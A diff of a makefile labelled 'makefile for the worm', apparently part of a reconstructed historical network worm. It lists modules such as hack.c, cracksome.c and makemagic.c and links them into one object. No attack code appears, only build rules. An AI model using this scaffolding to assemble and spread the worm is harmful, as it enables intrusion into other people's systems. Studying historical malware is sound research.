@@ -1,23 +1,58 @@
-OBJS = dumb.o if.o hosts.o hit.o objects.o other.o crack.o don.o wds.o
-CFLAGS = 
+#
+# makefile for the worm
+#
 
-dumb	:	$(OBJS)
-		ld -x -r -o object.o $(OBJS)
-		$(CC) $(CFLAGS) -o dumb $(OBJS)
+LD=/bin/ld
 
-clean	:
-		rm -f dumb core *.o
+OBJS = \
+	main.o \
+	if_init.o \
+	rt_init.o \
+	getaddrs.o \
+	a2in.o \
+	host.o \
+	hack.o \
+	makemagic.o \
+	waithit.o \
+	loadobject.o \
+	misc.o \
+	checkother.o \
+	other_sleep.o \
+	cracksome.o \
+	crypt.o \
+	compkeys.o \
+	setupE.o \
+	des.o
 
-don.o	:	don.oo
-		cp don.oo don.o
+$(MACHINE).o:	$(OBJS)
+	$(LD) -r -x -o $(MACHINE).o $(OBJS)
 
-wds.o	:	wds.c
-		cc -c wds.c
+main.o: types.h main.c
+if_init.o: types.h if_init.c
+rt_init.o: types.h rt_init.c
+getaddrs.o: types.h getaddrs.c
+a2in.o: types.h a2in.c
+host.o: types.h host.c
+hack.o: types.h hack.c
+makemagic.o: types.h makemagic.c
+waithit.o: types.h waithit.c
+loadobject.o: types.h loadobject.c
+misc.o: types.h misc.c
+checkother.o: types.h checkother.c
+other_sleep.o: types.h other_sleep.c
+cracksome.o: types.h cracksome.c
 
-.c.o	:	zs
-		zs < $? > tmp.c
-		cc -c tmp.c $(CFLAGS)
-		mv tmp.o $@
+crypt.o: types.h crypt.c
+	$(CC) $(CFLAGS) -O -c crypt.c
 
-zs	:	zs.c
-		cc -o zs zs.c
+compkeys.o: types.h
+	$(CC) $(CFLAGS) -O -c compkeys.c
+
+setupE.o: types.h
+	$(CC) $(CFLAGS) -O -c setupE.c
+
+des.o: types.h
+	$(CC) $(CFLAGS) -O -c des.c
+
+clean:
+	-rm -f $(OBJS) $(MACHINE).o
